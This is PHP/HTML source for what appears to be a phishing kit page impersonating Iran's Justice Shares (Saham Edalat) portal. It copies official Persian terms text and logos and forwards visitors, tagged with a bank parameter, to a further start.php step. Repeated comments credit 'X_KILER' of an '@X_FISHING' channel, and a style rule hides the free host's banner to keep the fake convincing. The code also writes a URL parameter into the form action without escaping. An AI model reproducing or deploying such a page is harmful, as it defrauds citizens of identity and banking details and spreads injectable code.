
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>
<!DOCTYPE html>

<html lang="en">

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

<head>

    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>سامانه سهام عدالت - سازمان خصوصی سازی</title>



    <link rel='stylesheet' href='css/styles.css'>

    <link rel='stylesheet' href='css/grid.min.css'>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

    <script>

        function numberonly(elem) {

            elem.value = elem.value.toString().replace(/(?!^-)[^0-9]/g, "");

        }



        function elemval(elemid){

            return document.getElementById(elemid).value;

        }



        function focusElem(elemid){

            var elem = document.getElementById(elemid);

            elem.focus();

        }



    // show a notification animation on an element

    function notifyElem(elemid,msg) {

        var elem = document.getElementById(elemid);

        elem.focus();

        var elemclass = elem.className;

        elem.className = elemclass.replace('notifyelem', '');

        if(msg){

            alert(msg);

        }else{

            alert('لطفا اطلاعات مورد نطر را وارد نمایید.');

        }

        elem.className = elem.className + ' notifyelem';

    }



    </script>

</head>



<body class="applayout">


<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
    <div class="header no-print">

        <div class="logo-div hidden sm-block" style="">

            <img src="img/ipo_logo_white_sans.png">

        </div>

    </div>

    <div class="content blue-shadow">

        <div class="container">

            <div class="row">

                <div class="col-lg-4 ipologo hidden-xs hidden-sm text-right">

                    <img  src="img/khosoosisazi-ipo-ir2.png">

                </div>

                <div class="col-lg-4 center-content">

                    

                </div>

                <div class="col-lg-4 right-logo hidden-xs hidden-sm text-left">

                    <img src="img/ir-logo.png">

                </div>

            </div>

        </div>

            <!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->



        <div id="start-form" class="form-div">

    <div class="form-title">

        <div class="form-title-text">مقررات سامانه</div>

    </div>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

    <div class="form-content">

        <div class="form-content-inner">

            <div class="justify_right">

                <ul style="list-style: persian; margin-right: 20px">

                    <li>

                        این سامانه برای مشاهده خلاصه وضعیت سهام داران سهام عدالت است.

                    </li>

                    <li>

                        اطلاعات درخواست شده در این سامانه باید با دقت و توسط

                        <span class="red">

                            شخص سهام دار، بازماندگان ایشان و یا ولی، وکیل، قیم قانونی

                        </span>

                        آنها وارد شود.

                    </li>

                    <li>

                        وارد نمودن شماره تلفن همراه معتبر در سامانه به منظور ثبت شماره شبای بانکی الزامی است،

                        سازمان خصوصی سازی اجازه دارد در مواقع ضروری جهت اطلاع رسانی با شماره تلفن همراه اعلام شده

                        از طریق پیامک یا تماس تلفنی ارتباط برقرار نماید.

                    </li>

                    <li>

                        حداكثر زمان درنظر گرفته شده برای هر بار استفاده از سامانه 10 دقیقه می باشد.

                        پس از پایان زمان مذكور، مراجعه کننده باید از ابتدا به سامانه وارد شود.

                    </li>

                    <li>

                        در صورتی که در مراحل شناسایی بیش از سه بار،

                        اطلاعات هویتی نادرست انتخاب شود، دسترسی به سامانه تا 72 ساعت مسدود می گردد.

                    </li>

                    <li>

                        فعالیت مراجعین در این سامانه ثبت شده و قابل پیگیری می باشد.

                    </li>

                </ul>

            </div>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

            <div class="chk-agree">


             
     
  
               <form class="row" id="form1" action="start.php?P=<?php echo $P?>&e=<?php echo $e?>" method="POST"> 
       
 <div class="col-sm-9 col-xs-12">
     

                        <div class="new-fancy row">

                            <input class="css-chk" id="chk_agree" type="checkbox" onclick="acceptAgreement();">

                            <label for="chk_agree" class="fancy-check"></label>

                            <label for="chk_agree" onclick="acceptAgreement();" style="padding: 0 5px;">مطالب فوق را مطالعه نموده و می پذیرم</label>
                   

                        </div>

                    </div>

                    <div class="col-sm-3 col-xs-12">

                        <button id="btn_agree" type="button" class="new-btn btn-blue btn-normal disabled" onclick="handleSubmit();">ادامه</button>

                    </div>

                </form>

            </div>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

        </div>

    </div>



    <div class="form-footer">

        <div class="form-footer-row">

        </div>

    </div>



</div>

<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->

<script>



    function acceptAgreement() {

        var btn     = document.getElementById('btn_agree');

        var ocheck  = document.getElementById('chk_agree');

        if (ocheck.checked) {

            btn.className = 'new-btn btn-blue btn-normal';

        } else {

            btn.className = 'new-btn btn-blue btn-normal disabled';

        }

    }



    function handleSubmit(){

        if(document.getElementById('chk_agree').checked){

            document.getElementById('form1').submit();

        }

    }



</script>


<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->


    </div>



    <div id="footer" class="no-print hidden">

        <div id="footertop">

            کلیه حقوق مادی و معنوی این سایت متعلق به سازمان خصوصی سازی می باشد

        </div>

        <br>

        <div id="footerbot">

            طراحی شده توسط دفتر فناوری اطلاعات سازمان خصوصی سازی

        </div>

    </div>



</body>


<!--***************Created By:X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->


  <style>img[alt="www.000webhost.com"]{display:none;}</style>

</html>